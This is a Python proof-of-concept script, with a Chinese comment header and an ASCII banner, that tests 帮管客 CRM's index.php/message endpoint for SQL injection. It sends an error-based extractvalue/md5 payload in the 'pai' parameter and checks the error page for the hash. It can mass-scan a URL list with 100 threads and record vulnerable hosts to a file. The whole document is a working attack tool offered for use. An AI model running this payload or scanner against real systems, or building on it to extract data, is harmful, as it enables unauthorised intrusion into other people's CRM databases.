#帮管客CRM 客户管理系统 index.php的message 接口存在 sql 注入漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

   ▄████████ ████████▄    ▄█             ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███ ███    ███  ███            ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀  ███    ███  ███            ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███        ███    ███  ███            ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
▀███████████ ███    ███  ███            ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
         ███ ███    ███  ███            ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
   ▄█    ███ ███  ▀ ███  ███▌    ▄      ███  ███   ███     ███   ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
 ▄████████▀   ▀██████▀▄█ █████▄▄██      █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                         ▀                             ▀▀▀▀▀▀                                                                
                                                                     version:BGK_CRM_sql 1.0
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="帮管客 CRM message sql注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(md5(1)),0x7e))%23&xu=desc'
    url = target + url_payload
    # print(url)
    headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "Connection": "close"}
    # print(response.text)
    # print(response.status_code)
    try:
        response = requests.get(url=url,headers=headers,timeout=5,verify=False)
        # print(response.text)
        matches = re.findall(r'<p>(.*?)</p>', response.text)
        # print(matches)
        if response.status_code == 500 and '~c4ca4238a0b923820dcc509a6f75849' in matches[1]:
            print( f"{GREEN}[+] {url} 存在sql注入漏洞！{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception:
        pass
if __name__ == '__main__':
    main()
